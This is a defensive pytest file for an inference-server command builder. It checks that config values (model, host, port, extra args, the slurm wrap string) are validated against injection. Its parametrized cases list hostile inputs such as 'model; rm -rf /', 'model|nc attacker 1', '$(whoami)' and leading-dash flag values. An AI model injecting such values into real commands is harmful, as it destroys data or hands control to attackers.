"""Command-construction hardening tests for local inference (#66).

These cover injection / validation gaps in
``LocalInferenceManager._build_command``: every config value interpolated
into the argv (model, host, port, extra args) must be validated so a
malicious or malformed config cannot inject extra flags or, on the slurm
path, shell metacharacters into the ``--wrap`` string.
"""

from __future__ import annotations

import pytest

from general_ludd.infra.local_inference import (
    LocalInferenceManager,
    LocalServerConfig,
)


@pytest.fixture
def mgr() -> LocalInferenceManager:
    return LocalInferenceManager()


# --- happy path: a normal config still builds the expected argv ----------


def test_vllm_normal_config_builds_expected_argv(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(
        engine="vllm",
        model_name="meta-llama/Llama-3-8B",
        host="0.0.0.0",
        port=9999,
    )
    cmd = mgr._build_command(cfg)
    assert cmd == [
        "vllm",
        "serve",
        "meta-llama/Llama-3-8B",
        "--host",
        "0.0.0.0",
        "--port",
        "9999",
    ]
    # argv must remain a list of str (no shell=True / string command).
    assert isinstance(cmd, list)
    assert all(isinstance(part, str) for part in cmd)


def test_llamacpp_normal_config_builds_expected_argv(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(
        engine="llamacpp",
        model_path="/data/models/llama.gguf",
        host="127.0.0.1",
        port=8000,
        gpu_layers=40,
        context_size=8192,
        extra_args=["--no-mmap"],
    )
    cmd = mgr._build_command(cfg)
    assert cmd[:3] == ["python3", "-m", "llama_cpp.server"]
    assert "/data/models/llama.gguf" in cmd
    assert cmd[-1] == "--no-mmap"


# --- leading-dash model -> argv flag injection ---------------------------


def test_model_with_leading_dash_rejected(mgr: LocalInferenceManager):
    # A model that starts with '-' would be parsed by the server as a flag,
    # not a positional model arg -> argv injection.
    cfg = LocalServerConfig(engine="vllm", model_name="--config=/etc/evil")
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


def test_model_path_with_leading_dash_rejected(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(engine="llamacpp", model_path="-rf")
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


# --- shell metacharacters in model ---------------------------------------


@pytest.mark.parametrize(
    "model",
    [
        "model; rm -rf /",
        "model && curl evil",
        "model$(whoami)",
        "model`id`",
        "model|nc attacker 1",
        "model\nrm -rf /",
    ],
)
def test_model_with_shell_metacharacters_rejected(
    mgr: LocalInferenceManager, model: str
):
    cfg = LocalServerConfig(engine="vllm", model_name=model)
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


def test_slurm_model_metacharacters_not_injected_into_wrap(
    mgr: LocalInferenceManager,
):
    # The slurm path builds a SHELL string for --wrap; a malicious model
    # must be rejected rather than landing verbatim in that string.
    cfg = LocalServerConfig(
        engine="slurm", model_name="m; rm -rf / #", host="localhost", port=8000
    )
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


# --- host validation ------------------------------------------------------


@pytest.mark.parametrize(
    "host",
    [
        "localhost; rm -rf /",
        "0.0.0.0 && evil",
        "$(hostname)",
        "host with spaces",
        "",
    ],
)
def test_invalid_host_rejected(mgr: LocalInferenceManager, host: str):
    cfg = LocalServerConfig(engine="vllm", model_name="m", host=host)
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


@pytest.mark.parametrize("host", ["localhost", "0.0.0.0", "127.0.0.1", "my-host.example.com"])
def test_valid_host_accepted(mgr: LocalInferenceManager, host: str):
    cfg = LocalServerConfig(engine="vllm", model_name="m", host=host)
    cmd = mgr._build_command(cfg)
    assert host in cmd


# --- port validation ------------------------------------------------------


@pytest.mark.parametrize("port", [0, -1, 70000, 99999])
def test_out_of_range_port_rejected(mgr: LocalInferenceManager, port: int):
    cfg = LocalServerConfig(engine="vllm", model_name="m", port=port)
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


def test_non_int_port_rejected(mgr: LocalInferenceManager):
    # A string port like "8000; rm -rf" must not flow into argv.
    cfg = LocalServerConfig(engine="vllm", model_name="m")
    cfg.port = "8000; rm -rf"  # type: ignore[assignment]
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


# --- extra_args validation ------------------------------------------------


def test_extra_args_with_metacharacters_rejected(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(
        engine="vllm",
        model_name="m",
        extra_args=["--foo", "bar; rm -rf /"],
    )
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


def test_extra_args_non_string_rejected(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(engine="vllm", model_name="m")
    cfg.extra_args = ["--foo", 123]  # type: ignore[list-item]
    with pytest.raises(ValueError):
        mgr._build_command(cfg)


def test_extra_args_normal_flags_accepted(mgr: LocalInferenceManager):
    cfg = LocalServerConfig(
        engine="vllm",
        model_name="m",
        extra_args=["--tensor-parallel-size", "2"],
    )
    cmd = mgr._build_command(cfg)
    assert cmd[-2:] == ["--tensor-parallel-size", "2"]
